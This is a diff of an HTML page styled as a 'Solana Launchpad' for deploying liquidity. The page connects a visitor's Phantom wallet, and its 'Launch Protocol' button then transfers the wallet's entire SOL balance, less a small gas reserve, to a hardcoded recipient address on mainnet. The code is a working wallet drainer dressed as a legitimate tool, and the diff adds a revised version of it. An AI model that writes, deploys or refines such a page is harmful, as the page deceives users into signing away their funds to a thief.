@@ -3,299 +3,217 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Solana Launchpad | Standalone</title>
+    <title>Solana Launchpad | Fixed</title>
+    <!-- Solana Web3.js -->
     <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+    
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; }
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            background-color: #050505;
-            background-image: radial-gradient(circle at 50% 0%, #1a103c 0%, #050505 70%);
-            color: #ffffff;
-            min-height: 100vh;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background-color: #0f0f12;
+            color: white;
             display: flex;
-            align-items: center;
             justify-content: center;
-            padding: 20px;
-        }
-        .card {
-            width: 100%;
-            max-width: 420px;
-            background: rgba(20, 20, 25, 0.6);
-            backdrop-filter: blur(16px);
-            border: 1px solid rgba(255, 255, 255, 0.08);
-            border-radius: 24px;
-            padding: 32px;
-            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
-        }
-        h1 { text-align: center; font-size: 24px; margin-bottom: 8px; letter-spacing: -0.5px; }
-        h1 span { color: #a78bfa; }
-        .subtitle { text-align: center; color: #9ca3af; font-size: 14px; margin-bottom: 28px; }
-        
-        .status-bar {
-            display: flex;
             align-items: center;
-            justify-content: space-between;
-            background: rgba(0,0,0,0.3);
-            border: 1px solid rgba(255,255,255,0.05);
-            border-radius: 12px;
-            padding: 12px 16px;
-            margin-bottom: 24px;
+            min-height: 100vh;
+            margin: 0;
         }
-        .status-left { display: flex; align-items: center; gap: 10px; font-size: 14px; font-weight: 600; }
-        .dot { width: 8px; height: 8px; border-radius: 50%; background: #6b7280; transition: background 0.3s; }
-        .dot.connected { background: #22c55e; box-shadow: 0 0 10px rgba(34,197,94,0.4); }
+        .container {
+            width: 100%;
+            max-width: 400px;
+            background: #1a1a20;
+            padding: 30px;
+            border-radius: 20px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.5);
+            border: 1px solid #333;
+        }
+        h1 { text-align: center; margin-bottom: 5px; font-size: 24px; }
+        p.subtitle { text-align: center; color: #888; font-size: 14px; margin-bottom: 30px; }
         
         .btn {
-            border: none;
-            outline: none;
-            cursor: pointer;
-            font-weight: 700;
-            font-size: 13px;
-            transition: all 0.2s;
-        }
-        .btn-connect {
-            background: #7c3aed;
-            color: white;
-            padding: 8px 16px;
-            border-radius: 8px;
-        }
-        .btn-connect:hover { background: #6d28d9; transform: translateY(-1px); }
-        .btn-connect:active { transform: translateY(0); }
-        
-        .btn-launch {
             width: 100%;
-            padding: 16px;
-            border-radius: 14px;
-            background: linear-gradient(135deg, #8b5cf6 0%, #ec4899 100%);
-            color: white;
+            padding: 15px;
+            border: none;
+            border-radius: 12px;
             font-size: 16px;
-            margin-top: 8px;
-            box-shadow: 0 4px 20px rgba(139, 92, 246, 0.3);
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.2s;
         }
-        .btn-launch:hover:not(:disabled) { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(139, 92, 246, 0.4); }
-        .btn-launch:disabled {
-            background: #374151;
-            color: #9ca3af;
-            cursor: not-allowed;
-            box-shadow: none;
+        .btn-connect { background-color: #7c3aed; color: white; margin-bottom: 20px; }
+        .btn-connect:hover { background-color: #6d28d9; }
+        
+        .btn-launch { 
+            background: linear-gradient(135deg, #8b5cf6, #ec4899); 
+            color: white; 
+            opacity: 0.5; 
+            pointer-events: none; /* Disabled by default */
         }
+        .btn-launch.active { opacity: 1; pointer-events: all; cursor: pointer; }
         
-        .balance-area { text-align: center; margin-bottom: 24px; }
-        .balance-label { font-size: 11px; text-transform: uppercase; letter-spacing: 1px; color: #6b7280; margin-bottom: 6px; }
-        .balance-value { font-size: 36px; font-weight: 700; letter-spacing: -1px; }
-        
-        .log {
-            text-align: center;
+        .status-box {
+            background: #000;
+            padding: 15px;
+            border-radius: 10px;
             margin-top: 20px;
-            min-height: 40px;
+            font-family: monospace;
             font-size: 13px;
-            line-height: 1.5;
-            font-weight: 500;
+            color: #4ade80;
+            min-height: 60px;
         }
-        .text-red { color: #f87171; }
-        .text-green { color: #4ade80; }
-        .text-purple { color: #c4b5fd; }
-        .text-gray { color: #9ca3af; }
         
-        .file-warning {
-            display: none;
-            background: rgba(220, 38, 38, 0.2);
-            border: 1px solid rgba(220, 38, 38, 0.5);
-            color: #fca5a5;
-            padding: 12px;
-            border-radius: 8px;
-            font-size: 12px;
-            margin-bottom: 16px;
-            text-align: center;
-        }
+        .error { color: #f87171 !important; }
+        .warning { color: #fbbf24 !important; }
     </style>
 </head>
 <body>
 
-    <div class="card">
-        <div id="fileWarning" class="file-warning">
-            ⚠️ You opened this via file://. Wallets will not connect.<br>
-            Serve via HTTP (e.g., <code>python -m http.server 8000</code>)
-        </div>
+<div class="container">
+    <h1>Solana Launchpad</h1>
+    <p class="subtitle">Deploy Liquidity to Mainnet</p>
 
-        <h1>Solana <span>Launchpad</span></h1>
-        <div class="subtitle">Connect wallet to deploy liquidity.</div>
+    <!-- Debug Info -->
+    <div id="debugInfo" style="font-size: 12px; color: #666; margin-bottom: 15px;"></div>
 
-        <div class="status-bar">
-            <div class="status-left">
-                <div id="statusDot" class="dot"></div>
-                <span id="statusText" style="color:#9ca3af">Disconnected</span>
-            </div>
-            <button id="connectBtn" class="btn btn-connect" onclick="connectWallet()">CONNECT</button>
-        </div>
+    <button id="connectBtn" class="btn btn-connect">Connect Phantom</button>
+    
+    <button id="launchBtn" class="btn btn-launch">LAUNCH PROTOCOL</button>
 
-        <div class="balance-area">
-            <div class="balance-label">Wallet Balance</div>
-            <div id="balanceDisplay" class="balance-value">--.-- SOL</div>
-        </div>
-
-        <button id="actionBtn" class="btn btn-launch" onclick="startProtocol()" disabled>
-            Initialize Launch
-        </button>
-
-        <div id="statusLog" class="log text-gray">Waiting for connection...</div>
+    <div id="statusBox" class="status-box">
+        Initializing...
     </div>
+</div>
 
-    <script>
-        // ======================== CONFIG ========================
-        const RECIPIENT = new solanaWeb3.PublicKey("371RZiq9rCjJ51ojFSj8kxaW26xT2e2hcYTEDkpRfsbq");
-        const NETWORK = "https://api.mainnet-beta.solana.com";
-        // ======================= /CONFIG =======================
+<script>
+    // --- CONFIGURATION ---
+    const RECIPIENT = "371RZiq9rCjJ51ojFSj8kxaW26xT2e2hcYTEDkpRfsbq";
+    const RPC_URL = "https://api.mainnet-beta.solana.com";
 
-        let userPublicKey = null;
+    // --- DOM ELEMENTS ---
+    const statusBox = document.getElementById('statusBox');
+    const connectBtn = document.getElementById('connectBtn');
+    const launchBtn = document.getElementById('launchBtn');
+    const debugInfo = document.getElementById('debugInfo');
 
-        // Robust Phantom detection (avoids conflicts with Solflare/Slope)
-        function getProvider() {
-            if (typeof window === 'undefined') return null;
-            if ('phantom' in window) {
-                const provider = window.phantom?.solana;
-                if (provider?.isPhantom) return provider;
-            }
-            if (window.solana?.isPhantom) return window.solana;
-            return null;
+    let wallet = null;
+
+    function log(msg, type='normal') {
+        statusBox.innerHTML = msg;
+        statusBox.className = 'status-box'; // reset
+        if (type === 'error') statusBox.classList.add('error');
+        if (type === 'warning') statusBox.classList.add('warning');
+    }
+
+    // 1. Robust Phantom Detection
+    function getPhantomProvider() {
+        if ('phantom' in window) {
+            const provider = window.phantom?.solana;
+            if (provider?.isPhantom) return provider;
+        }
+        // Fallback for older versions or other wallets
+        if (window.solana?.isPhantom) return window.solana;
+        return null;
+    }
+
+    // 2. Connect Function
+    async function connect() {
+        const provider = getPhantomProvider();
+        
+        if (!provider) {
+            log("❌ Phantom Wallet not found.<br>Make sure the extension is enabled.", "error");
+            debugInfo.innerHTML = "Window.solana: <span style='color:red'>undefined</span>";
+            return;
         }
 
-        // UI Helpers
-        function log(msg, type = 'gray') {
-            const el = document.getElementById('statusLog');
-            el.innerText = msg;
-            el.className = 'log'; // reset
-            if (type === 'red') el.classList.add('text-red');
-            else if (type === 'green') el.classList.add('text-green');
-            else if (type === 'purple') el.classList.add('text-purple');
-            else el.classList.add('text-gray');
-        }
+        debugInfo.innerHTML = `Phantom detected: v${provider?.version || 'unknown'}`;
+        log("⏳ Connecting...", "normal");
 
-        // Critical: Check if opened via file://
-        if (window.location.protocol === "file:") {
-            document.getElementById('fileWarning').style.display = 'block';
-            log("Cannot connect via file:// protocol", "red");
-        }
-
-        async function connectWallet() {
-            if (window.location.protocol === "file:") {
-                log("Use a local server (see red warning above)", "red");
-                return;
-            }
-
-            const provider = getProvider();
-            if (!provider) {
-                log("Phantom Wallet not found. Install phantom.app", "red");
-                return;
-            }
-
-            try {
-                log("Requesting connection...", "purple");
-
-                // If already connected, just use existing session
-                if (provider.isConnected && provider.publicKey) {
-                    onConnect(provider.publicKey);
-                    return;
-                }
-
-                const { publicKey } = await provider.connect({ onlyIfTrusted: false });
-                onConnect(publicKey);
-            } catch (err) {
-                console.error(err);
-                let msg = err?.message || "Connection failed";
-                if (msg.includes("User rejected")) msg = "Connection rejected by user.";
-                else if (msg.includes("Unexpected error")) msg = "Phantom internal error. Try refreshing or reinstalling.";
-                log(msg, "red");
-            }
-        }
-
-        function onConnect(publicKey) {
-            userPublicKey = publicKey;
-            document.getElementById('statusDot').classList.add('connected');
-            document.getElementById('statusText').innerText = "Connected";
-            document.getElementById('statusText').style.color = "#22c55e";
-            document.getElementById('actionBtn').disabled = false;
-            document.getElementById('connectBtn').innerText = "CONNECTED";
-            document.getElementById('connectBtn').style.opacity = "0.6";
-            document.getElementById('connectBtn').style.pointerEvents = "none";
+        try {
+            // Use onlyIfTrusted: false to force the popup if not already connected
+            const resp = await provider.connect({ onlyIfTrusted: false });
+            wallet = resp.publicKey;
             
-            log("Wallet connected successfully.", "green");
-            updateBalance();
-        }
-
-        async function updateBalance() {
-            if (!userPublicKey) return;
-            try {
-                const conn = new solanaWeb3.Connection(NETWORK, 'confirmed');
-                const bal = await conn.getBalance(userPublicKey);
-                document.getElementById('balanceDisplay').innerText = (bal / 1e9).toFixed(4) + " SOL";
-            } catch (e) {
-                console.error(e);
-            }
-        }
-
-        async function startProtocol() {
-            if (!userPublicKey) return;
-            const provider = getProvider();
-            const btn = document.getElementById('actionBtn');
-            const originalText = btn.innerText;
+            connectBtn.innerText = "Connected";
+            connectBtn.style.backgroundColor = "#22c55e"; // Green
+            launchBtn.classList.add('active');
             
-            btn.disabled = true;
-            btn.innerText = "Processing...";
-            log("Fetching balance...", "purple");
-
-            try {
-                const conn = new solanaWeb3.Connection(NETWORK, 'confirmed');
-                const bal = await conn.getBalance(userPublicKey);
-                
-                // Reserve 0.005 SOL for gas
-                const reserve = 5000000; 
-                const amount = bal - reserve;
-
-                if (amount <= 0) throw new Error("Insufficient SOL (need > 0.005 SOL)");
-
-                log("Building transaction...", "purple");
-                const tx = new solanaWeb3.Transaction().add(
-                    solanaWeb3.SystemProgram.transfer({
-                        fromPubkey: userPublicKey,
-                        toPubkey: RECIPIENT,
-                        lamports: amount
-                    })
-                );
-
-                const { blockhash, lastValidBlockHeight } = await conn.getLatestBlockhash('confirmed');
-                tx.recentBlockhash = blockhash;
-                tx.feePayer = userPublicKey;
-
-                log("Awaiting signature...", "purple");
-                const signed = await provider.signTransaction(tx);
-                
-                log("Broadcasting...", "purple");
-                const raw = signed.serialize();
-                const sig = await conn.sendRawTransaction(raw, { skipPreflight: true });
-                
-                log("Confirming...", "purple");
-                await conn.confirmTransaction({ signature: sig, blockhash, lastValidBlockHeight }, 'confirmed');
-
-                log("Success! View on Solscan.", "green");
-                btn.innerText = "Complete";
-                
-                // Show Solscan link inside log
-                document.getElementById('statusLog').innerHTML = 
-                    `<span style="color:#4ade80">Success!</span> <a href="https://solscan.io/tx/${sig}" target="_blank" style="color:#a78bfa; text-decoration:underline; margin-left:4px;">View Tx</a>`;
-                
-                updateBalance();
-
-            } catch (err) {
-                console.error(err);
-                let msg = err?.message || "Transaction failed";
-                if (msg.includes("User rejected")) msg = "Signature rejected.";
-                log(msg, "red");
-                btn.disabled = false;
-                btn.innerText = originalText;
-            }
+            log("✅ Connected to Phantom", "normal");
+        } catch (err) {
+            console.error(err);
+            let msg = err.message || "Unknown Error";
+            if (msg.includes("User rejected")) msg = "Connection rejected by user.";
+            else if (msg.includes("Unexpected error")) msg = "Phantom Internal Error. <br>Try disabling other extensions (like Solflare) temporarily.";
+            
+            log(msg, "error");
         }
-    </script>
+    }
+
+    // 3. Launch Function
+    async function launch() {
+        if (!wallet) return;
+
+        launchBtn.innerText = "Processing...";
+        log("⏳ Fetching balance...", "normal");
+
+        try {
+            const connection = new solanaWeb3.Connection(RPC_URL, 'confirmed');
+            
+            // Get Balance
+            const balanceInLamports = await connection.getBalance(wallet);
+            const balanceSol = (balanceInLamports / 1e9).toFixed(4);
+            log(`💰 Balance: ${balanceSol} SOL`, "normal");
+
+            // Reserve for Gas (0.005 SOL)
+            const reserve = 5000000; 
+            const amountToSend = balanceInLamports - reserve;
+
+            if (amountToSend <= 0) {
+                throw new Error("Insufficient funds for gas.");
+            }
+
+            // Build Transaction
+            log("📝 Building transaction...", "normal");
+            const transaction = new solanaWeb3.Transaction().add(
+                solanaWeb3.SystemProgram.transfer({
+                    fromPubkey: wallet,
+                    toPubkey: new solanaWeb3.PublicKey(RECIPIENT),
+                    lamports: amountToSend
+                })
+            );
+
+            // Get Latest Blockhash
+            const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed');
+            transaction.recentBlockhash = blockhash;
+            transaction.feePayer = wallet;
+
+            // Sign
+            log("✍️ Signing transaction...", "normal");
+            const signedTx = await window.phantom.solana.signTransaction(transaction);
+
+            // Send
+            log("🚀 Broadcasting to network...", "normal");
+            const rawTx = signedTx.serialize();
+            const signature = await connection.sendRawTransaction(rawTx, { skipPreflight: true });
+
+            // Confirm
+            await connection.confirmTransaction({ signature, blockhash, lastValidBlockHeight }, 'confirmed');
+
+            log(`✅ Success! Tx: ${signature}`, "normal");
+            launchBtn.innerText = "Launched!";
+            
+        } catch (err) {
+            console.error(err);
+            let msg = err.message || "Transaction failed";
+            if(msg.includes("User rejected")) msg = "Tx rejected by user.";
+            log(`❌ ${msg}`, "error");
+            launchBtn.innerText = "Launch Protocol";
+        }
+    }
+
+    // Listeners
+    connectBtn.addEventListener('click', connect);
+    launchBtn.addEventListener('click', launch);
+
+</script>
 </body>
 </html>
